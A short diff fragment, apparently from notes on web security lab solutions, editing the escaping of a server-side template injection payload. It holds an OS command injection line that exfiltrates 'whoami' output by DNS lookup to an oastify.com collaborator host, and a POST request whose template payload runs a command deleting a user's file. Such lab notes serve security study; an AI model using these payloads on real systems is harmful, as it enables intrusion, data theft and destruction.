@@ -1410,7 +1410,7 @@ $(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
 POST /my-account/change-blog-post-author-display HTTP/2
 ...
 
-blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
+blog-post-author-display=user.nickname}}\{\%+import+os+\%\}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
 ```
 
 
